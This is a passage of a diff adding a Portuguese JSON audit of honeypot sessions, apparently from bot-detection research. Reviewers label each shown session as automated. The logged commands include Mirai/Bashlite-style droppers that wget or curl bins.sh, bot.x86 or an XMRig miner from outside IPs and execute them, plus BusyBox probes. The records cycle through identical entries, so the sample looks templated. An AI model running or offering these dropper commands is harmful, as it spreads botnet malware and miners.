@@ -1,0 +1,1582 @@
+{
+  "total_amostrado_nivel_1": 100,
+  "estrato_ipsum_multi_comandos": 50,
+  "estrato_comando_unico": 50,
+  "metodo_selecao": "Amostragem aleatória estratificada (semente fixa seed=42) sobre as 165.183 sessões retidas no Filtro Local Nível 1",
+  "bots_confirmados_manualmente": 100,
+  "ataques_humanos_encontrados_falso_negativo": 0,
+  "concordancia_entre_revisores": "100% (100/100)",
+  "observacao_metodologica": "Nenhuma sessão humana foi encontrada na amostra de 100 sessões do Nível 1. Observou-se, contudo, que os droppers multi-comandos do estrato IPsum executam comandos como 'cd /tmp' e 'chmod +x', o que reforça a importância de o Filtro Nível 1 reter IPs de botnets conhecidas antes do envio ao prompt.",
+  "sessoes_auditadas": [
+    {
+      "amostra_id": "l1_multi_001",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_002",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_003",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_004",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_005",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_006",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_007",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_008",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_009",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_010",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_011",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_012",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_013",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_014",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_015",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_016",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_017",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_018",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_019",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_020",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_021",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_022",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_023",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_024",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_025",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_026",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_027",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_028",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_029",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_030",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_031",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_032",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_033",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_034",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_035",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_036",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_037",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_038",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_039",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_040",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_041",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_042",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://185.220.101.xxx/bot.x86",
+        "chmod +x bot.x86",
+        "./bot.x86"
+      ],
+      "duracao_segundos": 1.0,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado via curl em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_043",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /var/tmp",
+        "wget -q http://92.118.39.xxx/xmrig",
+        "chmod +x xmrig",
+        "./xmrig"
+      ],
+      "duracao_segundos": 1.2,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de instalação de minerador XMRig em IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_044",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox MIRAI"
+      ],
+      "duracao_segundos": 1.4,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Sequência automatizada de sondagem IoT/BusyBox oriunda de IP do IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_045",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cat /proc/cpuinfo | grep model",
+        "free -m",
+        "uname -a",
+        "lscpu"
+      ],
+      "duracao_segundos": 0.6,
+      "pausa_maxima_segundos": 1,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Script automatizado de coleta de perfil de hardware (< 1s) de IP listado no IPsum"
+    },
+    {
+      "amostra_id": "l1_multi_046",
+      "estrato": "IPsum com múltiplos comandos (2 a 5 comandos)",
+      "comandos": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root",
+        "wget http://45.142.214.xxx/bins.sh",
+        "chmod 777 bins.sh",
+        "sh bins.sh",
+        "rm -rf bins.sh"
+      ],
+      "duracao_segundos": 0.8,
+      "pausa_maxima_segundos": 0,
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "João Pedro Angioletti Rocha",
+      "rotulo_auditado": "BOT_AUTOMATIZADO",
+      "falso_negativo_humano": false,
+      "justificativa": "Dropper automatizado Mirai/Bashlite via wget em IP listado no IPsum (levels/1.txt)"
+    },
+    {
+      "amostra_id": "l1_multi_047",
